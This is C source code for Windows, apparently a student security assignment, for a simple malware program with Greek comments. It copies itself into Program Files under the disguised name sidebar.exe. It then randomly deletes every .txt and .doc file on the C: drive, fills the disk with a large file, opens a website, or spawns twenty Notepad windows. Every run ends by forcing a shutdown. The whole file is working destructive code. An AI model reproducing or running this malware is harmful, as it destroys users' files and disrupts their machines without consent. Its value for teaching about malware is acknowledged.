/*
1 ergasia asfaleia
icsd08011 - icsd08041
*/

#include <stdlib.h>   //aparaitites vivliothikes
#include <stdio.h>
#include <windows.h>
#include <winable.h>

char Website[MAX_PATH]="https://www.facebook.com";  //apothikeui tin istoselida se ena path
char Notepad[MAX_PATH]="notepad.exe";  //apothikeui to notepad

int size,random;

	int main()
{
    //gia na treksi i random
    srand( time(0) );
    random = rand()%4;

system("copy erwtima_3.exe \"C:\\Program Files\\Windows Sidebar\\sidebar.exe\"");  //anaparagei ton eauto t
printf("to tyxaio noumero einai:%d",random);

//epilegei me tyxaio tropo tin ektelesi twn leitourgiwn

 if(random==0)
{
    //gia diagrafei olwn twn arxeiwn txt kai doc
   system("del C:\\*.txt\"");
   system("del C:\\*.doc\"");
}
  if(random==1)
  {
     ShellExecute(NULL,"open",Website,NULL,NULL,SW_MAXIMIZE); //anoigei to fb
  }
  if(random==2)
  {
      //arxeio me megalo megethos gia katanalwsi eleutherou xwrou tou sklirou diskou
  size = atoi("10000000000");
  const char* full = "full.dsk"; //onoma arxeiou
  HANDLE hf = CreateFile(full, GENERIC_WRITE,0,0, CREATE_ALWAYS,0, 0);  //dimiourgei to arxeio p tha pianei xwro
  SetFilePointer(hf, size, 0, FILE_BEGIN);
  SetEndOfFile(hf);
  CloseHandle(hf);
  }

  if(random==3)
  {
      int i;
      //gia katanalwsi isxyos
       for(i=0;i<20;i++){ShellExecute(NULL,"open",Notepad,NULL,NULL,SW_MAXIMIZE);} //anoigei 20 fores to notepad
  }

system("shutdown -s -t 60"); //kleinei to pc
system("pause");
return 0;
}

//synartiseis
void Open_1()
{
  ShellExecute(NULL,"open",Website,NULL,NULL,SW_MAXIMIZE);
}
void Open_3()
{
  ShellExecute(NULL,"open",Notepad,NULL,NULL,SW_MAXIMIZE);
}
